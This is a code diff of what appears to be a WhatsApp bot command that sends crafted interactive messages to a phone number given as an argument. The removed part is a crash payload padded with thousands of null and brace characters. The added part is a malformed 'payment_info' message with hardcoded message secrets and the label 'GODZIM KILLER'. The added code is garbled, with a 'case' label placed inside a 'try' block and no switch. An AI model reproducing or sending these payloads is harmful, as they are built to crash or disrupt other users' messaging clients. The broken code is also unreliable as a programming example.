@@ -4,42 +4,37 @@ let handler = async (m, { conn, args, command }) => {
 
     let numi = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net"
 
-    try {
-      await sock.relayMessage(numi, {
-                    interactiveMessage: {
-                        body: {
-                            text: "bruxel4s"
-                        },
-                        nativeFlowMessage: {
-                            buttons: [
-                                {
-                                    name: "payment_method",
-                                    buttonParamsJson: JSON.stringify({
-                                        reference_id: null,
-                                        payment_method: "\u0000".repeat(0x1920),
-                                        payment_timestamp: null,
-                                    }),
-                                },
-                                {
-                                    name: "single_select", buttonParamsJson: "{".repeat(1000),
-                                },
-                            ],
-                            messageParamsJson: "{".repeat(100),
-                        },
-                    },
-                }, {
-                    additionalNodes: [
+    try {case 'g':{
+await conn.relayMessage(from, {
+    "messageContextInfo": {
+        "deviceListMetadata": {
+            "recipientKeyHash": "mmsUMggo7tQ8+g==",
+            "recipientTimestamp": "1754274809"
+        },
+        "deviceListMetadataVersion": 2,
+        "messageSecret": "ZOpQ279X/FepMc200ZJ/uz9haymINnZtTuc/a2IJetY="
+    },
+    "interactiveMessage": {
+        "nativeFlowMessage": {
+            "buttons": [
+                {
+                    "name": "payment_info",
+                    "buttonParamsJson": "{\"currency\":\"BRL\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"by 𝐆𝐎𝐃𝐙𝐈𝐌 𝑲𝑰𝑳𝑳𝑬𝑹.𝙼𝙿𝟻\",\"key\":\"NAO GRITA\",\"key_type\":\"EMAIL\"}}],\"share_payment_status\":false,\"referral\":\"chat_attachment\"}"
+                }
+            ]
+        }
+    }
+},{additionalNodes: [
                         {
                             tag: "biz",
                             attrs:
                             {
-                                native_flow_name: "payment_method"
+                                native_flow_name: "payment_info"
                             }
                         },
-                    ],
-                    participant: { jid: numi},
-                    userJid: numi,
-                });
+                    ]})
+}
+break
       })
 
       m.reply(`✅ Inviato a ${args[0]}`)
